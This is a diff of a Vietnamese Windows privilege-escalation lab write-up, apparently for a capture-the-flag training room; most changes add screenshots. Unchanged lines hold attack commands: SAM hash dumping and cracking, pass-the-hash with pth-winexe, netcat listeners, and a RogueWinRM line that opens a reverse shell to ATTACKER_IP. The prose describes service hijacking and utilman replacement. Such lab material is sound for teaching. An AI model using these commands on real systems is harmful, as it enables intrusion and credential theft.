@@ -163,6 +163,8 @@ Nếu bạn muốn tiết kiệm thời gian, truy vấn đến key để tìm t
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" 
 ```
 
+<img width="386" height="327" alt="image" src="https://github.com/user-attachments/assets/ddf64c29-fbd6-43cd-bc4a-b7233db85c87" />
+
 Vì một vài lí do mật khẩu không được lưu trong registry. Bạn có thể nhập mật khẩu là password123
 
 Trên Kali, dùng lệnh winexe để mở command prompt chạy với đặc quyền của admin:
@@ -204,6 +206,8 @@ pip3 install pycryptodome
 python3 creddump7/pwdump.py SYSTEM SAM 
 ```
 
+<img width="468" height="202" alt="image" src="https://github.com/user-attachments/assets/cd62e601-dad0-4d8c-9415-505f5fee192e" />
+
 Crack NTLM hash của admin bằng hashcat:
 
 ```javascript
@@ -221,6 +225,8 @@ Nhớ full hash bao gồm LM và NTLM hash, được phân tách nhau bằng d�
 ```javascript
 pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe 
 ```
+
+<img width="468" height="158" alt="image" src="https://github.com/user-attachments/assets/e26abc54-f20f-41af-b750-d5b86f26acd6" />
 
 # **Other Quick Wins**
 
@@ -244,11 +250,17 @@ Nhìn vào scheduled tasks trên hệ thống đích, bạn có thể thấy sch
 
 Scheduled tasks có thể được liệt kê bằng lệnh schtasks. Để xem thông tin chi tiết hơn về dịch vụ, bạn có thể dùng lệnh như sau:
 
+<img width="468" height="144" alt="image" src="https://github.com/user-attachments/assets/b0581927-68ff-4a56-b2f3-3516d705504d" />
+
 Bạn sẽ nhận được rất nhiều thông tin về 1 tác vụ, nhưng điều quan trọng với chúng ta là tham số “Task to Run” chỉ ra cái được thực thi bởi scheduled task và tham số “Run As User” hiển thị người dùng sẽ chạy tác vụ đó.
 
 Nếu bạn có thể điều chỉnh hoặc ghi đè tệp thực thi “Task to Run”, chúng ta có thể kiểm soát cái được thực thi bởi user taskusr1, dẫn đến leo thang đặc quyền. Để kiểm tra đặc quyền trên file thực thi, dùng lệnh icacls:
 
+<img width="468" height="117" alt="image" src="https://github.com/user-attachments/assets/3cfaf1cb-bd6f-4e2f-b4dd-00140165a092" />
+
 Nhóm BUILTIN\\Users có toàn quyền với tệp thực thi  Chúng ta có thể điều chỉnh file .bat và tiêm payload chúng ta thích. Để cho tiện lợi, nc64.exe có thể được tìm thấy trên C:\\tools. Cùng thay đổi tệp bat để mở 1 reverse shell:
+
+<img width="468" height="83" alt="image" src="https://github.com/user-attachments/assets/7104bcc8-0987-493f-a6c5-5a874c7ce771" />
 
 Sau đó bắt đầu 1 listener trên máy của kẻ tấn công:
 
@@ -258,7 +270,11 @@ nc -lnvv -p 4444 
 
 Lần tiếp theo khi scheduled tasks chạy, bạn sẽ nhận được reverse shell với đặc quyền của người dùng taskusr1. Trong khi bạn không thể bắt đầu 1 tác vụ trong hoàn cảnh thực tế và sẽ phải đợi để tác vụ đó được kích hoạt, chúng tôi đã cung cấp cho người dùng của bạn các đặc quyền để bắt đầu tác vụ 1 cách thủ công để giúp bạn tiết kiệm thời gian. Chúng ta có thể chạy tác vụ với lệnh sau:
 
+<img width="468" height="72" alt="image" src="https://github.com/user-attachments/assets/615ff61d-5c89-4dc3-ae21-1bcd77044e6b" />
+
 Và bạn sẽ nhận được reverse shell với đặc quyền của taskusr1 như mong đợi:
+
+<img width="468" height="175" alt="image" src="https://github.com/user-attachments/assets/af0147bf-4cb6-4f7c-9d5c-3cf1153dd9cb" />
 
 ## **AlwaysInstallElevated**
 
@@ -270,13 +286,21 @@ Phương pháp này yêu cầu 2 giá trị registry được thiết lập. B�
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
 ```
 
+<img width="378" height="41" alt="image" src="https://github.com/user-attachments/assets/f9bfbe36-d76b-4ca7-8ae1-58accaacb628" />
+
 ```javascript
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 
 ```
 
+<img width="383" height="46" alt="image" src="https://github.com/user-attachments/assets/6dbaa4df-634a-4d58-8887-274b09174398" />
+
 Bạn có thể tạo 1 tệp .msi độc hai bằng msfvenom như sau: 
 
+<img width="468" height="66" alt="image" src="https://github.com/user-attachments/assets/b85e0d5a-1069-44d3-9f18-2b470d5a5626" />
+
 Vì nó là reverse shell, bạn nên chạy module Metasploit Handler để lắng nghe kết nối đến. Khi bạn chuyển được tệp bạn mới tạo, bạn có thể chạy installer với lệnh sau và nhận kết nối: 
+
+<img width="468" height="72" alt="image" src="https://github.com/user-attachments/assets/617ece49-5c64-44cc-a3e3-8f5f29a6bdab" />
 
 # **Abusing Service Misconfigurations**
 
@@ -288,11 +312,17 @@ Mỗi dịch vụ trên máy Windows sẽ có 1 tệp thực thi tương ứng s
 
 Để hiểu rõ hơn về cấu trúc của 1 dịch vụ, cùng kiểm tra cấu hình dịch vụ apphostsvc với lệnh sc qc:
 
+<img width="409" height="212" alt="image" src="https://github.com/user-attachments/assets/fbd0809b-ac7d-4124-a4ab-b4739d37f2f8" />
+
 Ta có thể thấy tệp thực thi  được chỉ định qua tham số BINARY\_PATH\_NAME, và tài khoản dùng để chạy dịch vụ được hiển thị trong tham số SERVICE\_START\_NAME.
 
 Các dịch vụ có 1 danh sách kiểm soát truy cập tùy ý (DACL), chỉ định ai có đặc quyền để bắt đầu, ngưng, kết thúc, truy vấn cấu hình hay cấu hình lại dịch vụ. DACL có thể được xem bằng Process Hacker.
 
+<img width="306" height="321" alt="image" src="https://github.com/user-attachments/assets/57c62e39-8f0d-4447-ad9e-f235e71f2a38" />
+
 Tất cả cấu hình dịch vụ được lưu trữ trong registry HKLM\\SYSTEM\\CurrentControlSet\\Services\\
+
+<img width="430" height="200" alt="image" src="https://github.com/user-attachments/assets/9da3c720-c6ac-41f9-add3-a92156cae976" />
 
 Một subkey tồn tại trong mỗi dịch vụ trên hệ thống. Ta có thể thấy tệp thực thi ở giá trị ImagePath và tài khoản bắt đầu dịch vụ trên ObjectName. Nếu DACL đã được cấu hình cho dịch vụ, nó sẽ được lưu trữ trong 1 subkey gọi là Security. Chỉ có quản trị viên có thể điều chỉnh các dòng registry trên.
 
@@ -307,6 +337,7 @@ Chạy winPEAS để kiểm tra các dịch vụ bị lỗi cấu hình:
 ```javascript
 .\winPEASany.exe quiet servicesinfo
 ```
+<img width="468" height="48" alt="image" src="https://github.com/user-attachments/assets/a6c09cfe-0676-43b4-8a9c-d794aae4f8f6" />
 
 File Permissions: Everyone \[AllAccess\]
 
@@ -315,28 +346,43 @@ Kiểm tra xem người dùng có khởi chạy/dừng dịch vụ được khô
 ```javascript
 accesschk.exe -qlc filepermsvc
 ```
+<img width="364" height="244" alt="image" src="https://github.com/user-attachments/assets/f9db7642-4465-4fa9-8a26-9e273beb6f6c" />
 
 ### **Exploitation:** 
 
 Để hiểu cách nó hoạt động, cùng nhìn vào 1 lỗ hổng được tìm thấy trên Splinterware System Scheduler. Để bắt đầu, chúng ta sẽ truy vấn đến cấu hình dịch vụ bằng sc:
 
+<img width="352" height="186" alt="image" src="https://github.com/user-attachments/assets/0ba21d7d-01c5-43a0-890d-7cb2efd6e970" />
+
 Chúng ta có thể thấy dịch vụ được cài đặt bởi 1 phần mềm có lỗ hổng do svcuser1 chạy và tệp thực thi là C:\\Progra~2\\System~1\\WService.exe. Sau đó tiếp tục kiểm tra đặc quyền trên tệp thực thi:
+
+<img width="468" height="217" alt="image" src="https://github.com/user-attachments/assets/d60efbbb-0111-4b96-bfc0-b086287a365c" />
 
 Nhóm Everyone có thể chỉnh sửa (M) trên tệp thực thi. Điều đó đồng nghĩa với việc chúng ta có thể ghi đè nó với payload độc hại và dịch vụ sẽ thực thi nó với đặc quyền của người dùng đã cấu hình.
 
 Cùng tạo 1 payload exe-service bằng msfvenom và chuyển nó qua python webserver:  
 
+<img width="468" height="129" alt="image" src="https://github.com/user-attachments/assets/c394d27a-2718-4d2a-b4f6-6429e8abcec9" />
+
 Sau đó, ta lấy payload từ Powershell bằng lệnh sau: 
 
+<img width="468" height="69" alt="image" src="https://github.com/user-attachments/assets/c52b5743-48ab-4479-abef-d96b41d07a7d" />
+
 Khi payload ở trên máy chủ Windows,  tiếp tục thay thế tệp thực thi bằng payload của chúng ta. Ta cần 1 người dùng khác thực thi nó → cấp toàn quyền cho nhóm Everyone
+
+<img width="468" height="204" alt="image" src="https://github.com/user-attachments/assets/3c188499-8aa6-4d72-85fb-6daeab59d84d" />
 
 Bắt đầu 1 listener trên máy của kẻ tấn công: nc -lnvv -p 4445
 
 Cuối cùng, đợi dịch vụ khởi động. Trong 1 ngữ cảnh thông thường, bạn sẽ phải đợi để dịch vụ đó khởi động. Nhưng trong máy ảo bạn được cấp quyền khởi động để tiết kiệm thời gian.
 
+<img width="468" height="86" alt="image" src="https://github.com/user-attachments/assets/91be5107-95a5-4724-9e91-95ef72e5db2e" />
+
 **Lưu ý:** Powershell không có sc (Set-Content), do đó bạn cần dùng sc.exe để kiểm soát các dịch vụ với PowerShell bằng cách này.
 
 Bạn sẽ nhận được reverse shell với đặc quyền của svcusr1:
+
+<img width="468" height="174" alt="image" src="https://github.com/user-attachments/assets/4da335e8-f838-48db-9ad2-e0834ac827b5" />
 
 Cách di chuyển đến thư mục của người dùng: cd %userprofile%
 
@@ -349,6 +395,7 @@ Chạy winPEAS để kiểm tra các dịch vụ bị lỗi cấu hình:
 ```javascript
 .\winPEASany.exe quiet servicesinfo
 ```
+<img width="468" height="50" alt="image" src="https://github.com/user-attachments/assets/4c8fed78-2696-4c24-be4e-3187bf9ce78c" />
 
 No quotes and Space detected
 
@@ -363,6 +410,7 @@ Tùy thuộc vào phiên bản của accesschk.exe, cách chạy sẽ khác nhau
 ```javascript
 accesschk.exe -ucqv [service_name]
 ```
+<img width="468" height="312" alt="image" src="https://github.com/user-attachments/assets/e67551cf-14ec-461a-acad-63cf4b663b28" />
 
 ### **Exploitation**
 
@@ -374,9 +422,15 @@ Ví dụ, xem sự khác nhau giữa hai dịch vụ. Dịch vụ đầu tiên �
 
 **Lưu ý:** Bạn cần dùng ‘sc.exe’ nếu bạn đang ở PowerShell prompt.
 
+<img width="399" height="204" alt="image" src="https://github.com/user-attachments/assets/ac222c0e-da9f-4297-bb77-743d88b47737" />
+
 Cùng xem 1 dịch vụ khác không được trích dẫn chính xác:
 
+<img width="399" height="206" alt="image" src="https://github.com/user-attachments/assets/dae0be6a-4522-446d-b351-1beae17f7a97" />
+
 Khi SCM cố gắng thực thi tệp nhị phân, 1 vấn đề sẽ phát sinh. Vì có nhiều khoảng trắng trong tên của thư mục “Disk Sorter Enterprise”, lệnh này trở nên mơ hồ và SCM không biết bạn cố gắng thực thi lệnh nào.
+
+<img width="468" height="138" alt="image" src="https://github.com/user-attachments/assets/bfaa5f21-34b8-4827-97e7-75fc3450d6ab" />
 
 Khi bạn gửi 1 lệnh, các khoảng trắng thường là đối số phân tách nếu chúng không phải là 1 chuỗi trích dẫn. Câu lệnh được thực thi là C:\\\\MyPrograms\\\\Disk.exe và lấy phần còn lại là đối số.
 
@@ -400,15 +454,25 @@ Nếu kẻ tấn công tạo bất cứ tệp thực thi mà được tìm kiế
 
 Trong trường hợp của chúng ta, quản trị viên đã cài đặt tệp nhị phân Disk Sorter  ở c:\\MyPrograms. Theo mặc định, nó sẽ được kế thừa các đặc quyền của thư mục C:\\, cho phép bất cứ người dùng nào có thể tạo tập tin và thư mục trong nó. Chúng ta có thể kiểm tra bằng icacls: 
 
+<img width="468" height="175" alt="image" src="https://github.com/user-attachments/assets/6d8daf5e-c308-4eb7-8e3d-27dccb36b6b0" />
+
 Nhóm BUILTIN\\\\Users có đặc quyền AD và WD, cho phép người dùng tạo các thư mục con và tập tin.
 
 Quá trình tạo payload exe-service với msfvenom và vận chuyển nó đến máy chủ đích giống như trước đó. Chúng ta sẽ mở listener để nhận reverse shell khi nó được thực thi:
 
+<img width="468" height="101" alt="image" src="https://github.com/user-attachments/assets/32c98d8f-12dc-43a8-85b4-608c32b8a723" />
+
 Di chuyển payload đến C:\\MyPrograms\\Disk.exe. Chúng ta sẽ cấp toàn quyền cho mọi người trên file để đảm bảo nó được thực thi bởi dịch vụ:
+
+<img width="468" height="99" alt="image" src="https://github.com/user-attachments/assets/69b6970e-229d-430e-83eb-472a6c34aaa8" />
 
 Khi dịch vụ khởi động lại, payload của bạn sẽ được thực thi:
 
+<img width="468" height="76" alt="image" src="https://github.com/user-attachments/assets/6add7351-7bd3-4d78-bc3d-0ab5c4b3726e" />
+
 Bạn nhận được reverse shell với đặc quyền của svcusr2:
+
+<img width="468" height="154" alt="image" src="https://github.com/user-attachments/assets/024f544e-f608-4ffc-8a1c-6c0d58265961" />
 
 ## **Insecure Service Permissions**
 
@@ -429,23 +493,37 @@ Chạy winPEAS để kiểm tra các dịch vụ bị lỗi cấu hình:
 .\winPEASany.exe quiet servicesinfo
 ```
 
+<img width="468" height="32" alt="image" src="https://github.com/user-attachments/assets/0cf91a26-bf4f-459f-a9fa-c1a427d57c4a" />
+
 Chúng ta có thể điều chỉnh dịch vụ daclsvc.
 
 ### **Exploitation:**
 
 Để kiểm tra DACL của dịch vụ từ dòng lệnh, bạn có thể dùng Accesshk từ Sysinternals suite. Để cho thuận tiện, 1 bản sao chép đã có sẵn ở C:\\\\tools. Lệnh kiểm tra DACL của dịch vụ thmservice:
 
+<img width="468" height="222" alt="image" src="https://github.com/user-attachments/assets/36ba1e91-a681-43c6-868c-115ba7149c12" />
+
 Nhóm BUILTIN\\\\Users  có đặc quyền SERVICE\_ALL\_ACCESS, bất cứ ai cũng có thể cấu hình dịch vụ.
 
 Trước khi thay đổi dịch vụ, hãy dựng 1 exe-service reverse shell khác và bắt đầu 1 listener trên máy của kẻ tấn công. 
 
+<img width="468" height="102" alt="image" src="https://github.com/user-attachments/assets/5ea9df40-4187-43ba-8693-f192c0bf437e" />
+
 Vận chuyển tệp thực thi đến máy đích và lưu nó ở C:\\Users\\thm-unpriv\\rev-svc3.exe.  Nhớ cấp quyền cho mọi người để thực thi payload:
+
+<img width="468" height="63" alt="image" src="https://github.com/user-attachments/assets/b0652fec-b7db-4ca1-baaa-82e2beeb93a6" />
 
 Để thay đổi tệp thực thi và tài khoản của dịch vụ, chúng ta có thể dùng lệnh sau: 
 
+<img width="468" height="76" alt="image" src="https://github.com/user-attachments/assets/b2c00ae6-5e5c-46d3-a67a-f2cedd714f7d" />
+
 Lưu ý chúng ta có thể dùng bất cứ tài khoản nào để chạy dịch vụ. Chúng ta chọn LocalSystem là tài khoản có đặc quyền cao nhất. Để thực thi payload, khởi động lại dịch vụ: 
 
+<img width="468" height="73" alt="image" src="https://github.com/user-attachments/assets/4cd86bba-a96a-4961-83aa-cd5b2dac5337" />
+
 Và chúng ta sẽ nhận được shell trong máy của kẻ tấn công với đặc quyền của SYSTEM: 
+
+<img width="468" height="153" alt="image" src="https://github.com/user-attachments/assets/8dbf4db6-64ce-4f56-97b2-f58c251aeb06" />
 
 # **Windows Privileges**
 
@@ -477,17 +555,31 @@ Password: CopyMaster555
 
 Tài khoản này là 1 phần của nhóm “Backup Operators” được cấp quyền SeBackup và SeRestore. Chúng ta sẽ mở command prompt với tư cách là quản trị viên để sử dụng đặc quyền đó. Nhập lại mật khẩu 1 lần nữa để có được elevated console.
 
+<img width="255" height="105" alt="image" src="https://github.com/user-attachments/assets/96b4248c-4af2-4206-b8bd-9401120a1d2e" />
+
 Kiểm tra đặc quyền bằng lệnh sau:
+
+<img width="415" height="217" alt="image" src="https://github.com/user-attachments/assets/27d883b6-822b-4b18-9d2d-6edef6aa0327" />
 
 Để sao lưu SAM và SYSTEM hashes, chúng ta có thể dùng lệnh sau:
 
+<img width="415" height="122" alt="image" src="https://github.com/user-attachments/assets/ec0e29a8-4089-4a4d-9201-84f0ba7e7a84" />
+
 Điều này sẽ tạo một vài tập tin với registry hives content. Bây giờ chúng ta có thể sao chép những tệp đó đến máy của kẻ tấn công bằng SMB hoặc các phương thức khác. Đối với SMB, chúng ta có thể dùng smbserver.py để bắt đầu 1 máy chủ SMB đơn giản với 1 network share trong thư mục hiện hành của kẻ tấn công.
+
+<img width="468" height="106" alt="image" src="https://github.com/user-attachments/assets/2d5e1d5e-83d8-428f-8fc9-6ec4dd5fd05e" />
 
 Điều này sẽ tạo 1 share tên public trỏ đến thư mục share, yêu cầu tên người dùng và mật khẩu của phiên windows hiện tại. Sau đó, chúng ta có thể dùng lệnh copy trong máy nạn nhân để vận chuyển cả hai tệp qua AttackBox:
 
+<img width="468" height="89" alt="image" src="https://github.com/user-attachments/assets/29d4588f-9073-43ae-af94-532cea5ec1ee" />
+
 Dùng impacket để truy suất password hashes của người dùng: 
 
+<img width="468" height="111" alt="image" src="https://github.com/user-attachments/assets/49d9eaff-128b-4e28-82a5-cf14b55576b1" />
+
 Cuối cùng, chúng ta có thể dùng hash của Administrator để thực hiện 1 cuộc tấn công Pass-the-Hash và giành quyền truy cập đến máy đích với đặc quyền của SYSTEM:
+
+<img width="468" height="231" alt="image" src="https://github.com/user-attachments/assets/28d50d37-f277-46bb-b63c-99d42616c357" />
 
 ## **SeTakeOwnership**
 
@@ -497,19 +589,33 @@ Cuối cùng, chúng ta có thể dùng hash của Administrator để thực hi
 
 Kiểm tra đặc quyền:
 
+<img width="441" height="163" alt="image" src="https://github.com/user-attachments/assets/2a50a9d0-cfe9-4066-8982-eaca7e87b4ee" />
+
 Lần này chúng ta sẽ lạm dụng utilman.exe để leo thang đặc quyền. Utilman là 1 ứng dụng được dựng sẵn trong Windows cung cấp tùy chọn Ease of Access trong quá trình khóa màn hình:
+
+<img width="368" height="316" alt="image" src="https://github.com/user-attachments/assets/dbc43c81-e0fe-4bae-b682-7d64f65730f2" />
 
 Vì Utilman chạy với đặc quyền của hệ thống, chúng ta sẽ giành được đặc quyền của hệ thống nếu thay thế tệp nhị phân gốc với payload mà ta thích. Vì ta có thể làm chủ bất cứ tệp tin nào thì thay thế là chuyện tầm thường.
 
 Để thay thế utilman, chúng ta sẽ làm chủ nó với lệnh sau:
 
+<img width="468" height="113" alt="image" src="https://github.com/user-attachments/assets/e80b3286-b78b-4081-aabf-660a7e58a58b" />
+
 **Lưu ý:** việc làm chủ 1 tập tin không đồng nghĩa với việc bạn đã có các đặc quyền trên nó, nhưng làm chủ bạn có thể gán cho mình các đặc quyền mình muốn. Để cấp cho người dùng toàn quyền qua util.exe, dùng lệnh sau: 
+
+<img width="468" height="94" alt="image" src="https://github.com/user-attachments/assets/1784a462-0f4e-4b14-88d5-94e22332f677" />
 
 Sau đó, chúng ta sẽ thay thế utilman.exe bằng cách sao chép cmd.exe:
 
+<img width="468" height="84" alt="image" src="https://github.com/user-attachments/assets/d36fb2c0-b1ea-490b-bd36-a0ce338dacfe" />
+
 Để thực thi utilman, chúng ta sẽ khóa màn hình từ nút start:
 
+<img width="193" height="293" alt="image" src="https://github.com/user-attachments/assets/3095dd72-f852-4642-9887-b27dd14a6faf" />
+
 Tiếp tục chọn nút “Ease of Access”, chạy utilman.exe với đặc quyền của hệ thống. Vì chúng ta đã thay thế nó bằng 1 bản sao chép của cmd.exe, chúng ta sẽ có 1 command prompt với đặc quyền của hệ thống: 
+
+<img width="392" height="243" alt="image" src="https://github.com/user-attachments/assets/da8a717d-64da-46e8-beb1-2c15ed4e2449" />
 
 ## **SeImpersonate/SeAssignPrimaryToken**
 
@@ -518,6 +624,8 @@ Tiếp tục chọn nút “Ease of Access”, chạy utilman.exe với đặc q
 Việc mạo danh rất dễ hiểu khi bạn nghĩ về cách 1 máy chủ FTP hoạt động. Máy chủ FTP giới hạn người dùng chỉ được truy cập các tập tin mà họ được phép.
 
 Giả sử chúng ta có 1 dịch vụ FTP chạy với người dùng ftp. Không có mạo danh, nếu người dùng Ann đăng nhập máy chủ FTP và cố gắng truy cập các tập tin của cô ấy, dịch vụ FTP sẽ truy cập chúng bằng access token của chính nó thay vì của Ann.
+
+<img width="468" height="185" alt="image" src="https://github.com/user-attachments/assets/c998955b-741f-4816-817d-958e82d7e7ba" />
 
 Có một vài lí do mà dùng token của ftp không phải là ý tưởng tốt:
 
@@ -529,6 +637,8 @@ Có một vài lí do mà dùng token của ftp không phải là ý tưởng t�
     
 
 Nói cách khác, người dùng của dịch vụ FTP có đặc quyền SeImpersonate hay SeAssignPrimaryToken, tất cả điều này được đơn giản hóa một chút, vì dịch vụ FTP có thể tạm thời lấy access token của người dùng đăng nhập và dùng nó để thực hiện bất cứ tác vụ nào thay mặt họ:
+
+<img width="468" height="189" alt="image" src="https://github.com/user-attachments/assets/67af97c3-65fa-4b6e-b5fe-dc35408c0364" />
 
 Nếu người dùng Ann đăng nhập dịch vụ FTP và người dùng ftp có đặc quyền mạo danh, nó có thể mượn access token của Ann và dùng nó để truy cập tập tin của cô ấy. Với cách này, các tập tin không cần cung cấp quyền truy cập cho người dùng ftp và hệ điều hành xử lí việc phân quyền. Vì dịch vụ FTP đang giả mạo Ann, nó không thể truy cập các tập tin của Jude hay Bill trong phiên này.
 
@@ -549,6 +659,8 @@ Giả sử chúng ta đã thâm nhập 1 trang web chạy trên IIS và dựng �
 
 Chúng ta có thể dùng webshell để kiểm tra các đặc quyền của 1 tài khoản bị thâm nhập: 
 
+<img width="468" height="200" alt="image" src="https://github.com/user-attachments/assets/05471f7b-875c-46f7-9ca0-8789a58f67dd" />
+
 Để dùng RogueWinRM, đầu tiên chúng ta cần upload 1 khai thác đến hệ thống đích. Để cho tiện lợi, bạn có thể tìm thấy khai thác trong thư mục C:\\tools
 
 Khai thác RogueWinRM khả thi vì khi 1 người dùng (không có đặc quyền) bắt đầu dịch vụ BITS trong Windows, nó tự động tạo 1 kết nối đến cổng 5985 bằng đặc quyền của SYSTEM. Cổng 5985 thường được dùng cho dịch vụ WinRM, là 1 cổng hiển thị Powershell console có thể dùng từ xa qua mạng.
@@ -566,6 +678,7 @@ Và sau đó, dùng webshell để thực thi khai thác RogueWinRM:
 ```javascript
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442" 
 ```
+<img width="468" height="264" alt="image" src="https://github.com/user-attachments/assets/e2e9040e-c05e-4a7c-8d6d-04d6732bb0b3" />
 
 **Lưu ý:** khai thác có thể mất 2 phút để hoạt động, vì vậy trình duyệt của bạn có thể không phản hồi trong 1 lúc. Điều này xảy ra nếu bạn chạy khai thác nhiều lần vì nó bắt buộc phải đợi cho dịch vụ BITS dùng trước khi bắt đầu lại. Dịch vụ BITS sẽ dừng tự động sau 2 phút bắt đầu.
 
@@ -576,6 +689,8 @@ Tham số -p chỉ định tệp thực thi được chạy bởi khai thác, tr
 ```
 
 Nếu tất cả được thiết lập chính xác, bạn nên mong đợi 1 shell có đặc quyền của SYSTEM:
+
+<img width="468" height="163" alt="image" src="https://github.com/user-attachments/assets/a13e0ee0-7583-477e-9794-5ea6530db355" />
 
 # **Abusing vulnerable software** 
 
@@ -605,14 +720,24 @@ Một bản vá đã được phát hành, họ quyết định lệnh được 
 
 Để thực hiện một cuộc khai thác thành công, chúng ta cần hiểu cách giao tiếp với cổng 6064. May mắn cho chúng ta, giao thức được sử dụng khá rõ ràng và các gói tin gửi đi được mô tả như sau:
 
+<img width="468" height="253" alt="image" src="https://github.com/user-attachments/assets/1f0741bf-a907-4d66-a41d-cd5c136866d1" />
+
 Gói tin đầu tiên chỉ đơn giản là 1 gói tin hello chứa 1 chuỗi cố định. Gói tin thứ hai chỉ ra chúng ta muốn thực thi procedure thứ 5 vì nó là procedure bị dính lỗ hổng command injection. Hai gói tin cuối được dùng để gửi độ dài của câu lệnh và câu lệnh được thực thi.
 
 Khai thác có thể được dùng trong máy đích để leo thang đặc quyền và truy suất flag của bài toán. Để cho thuận tiện, đây là đoạn mã khai thác:
 
+<img width="468" height="224" alt="image" src="https://github.com/user-attachments/assets/9ad8ea1e-0d42-4505-aa0d-361373edfd4f" />
+
 Bạn có thể mở Powershell console và dán khai thác trực tiếp để thực thi nó. Lưu ý payload mặc định của khai thác được chỉ định trong biến $cmd sẽ tạo 1 user tên pwnd trong hệ thống, nhưng không gán cho anh ấy đặc quyền của quản trị viên, vì vậy chúng ta sẽ muốn thay đổi payload để trở nên hữu ích hơn. 
+
+<img width="468" height="67" alt="image" src="https://github.com/user-attachments/assets/0337d6bc-622b-4d91-9a47-fc44008003da" />
 
 Nó sẽ tạo user pwnd với mật khẩu: SimplePass123 và thêm người dùng vào nhóm administrators. Nếu khai thác thành công, bạn có thể chạy lệnh sau để kiểm tra người dùng pwnd  có tồn tại và là 1 phần trong nhóm administrators:
 
+<img width="404" height="159" alt="image" src="https://github.com/user-attachments/assets/3dd288da-ca20-4d90-8b1c-2b124f5c4a7a" />
+
 Cuối cùng bạn chạy command prompt với đặc quyền của quản trị viên:
+
+<img width="224" height="208" alt="image" src="https://github.com/user-attachments/assets/e888f2d0-1506-4103-8605-2886f2027f50" />
 
 Khi được hỏi về thông tin đăng nhập, dùng tài khoản pwnd. Bạn có thể truy suất flag từ desktop của quản trị viên.
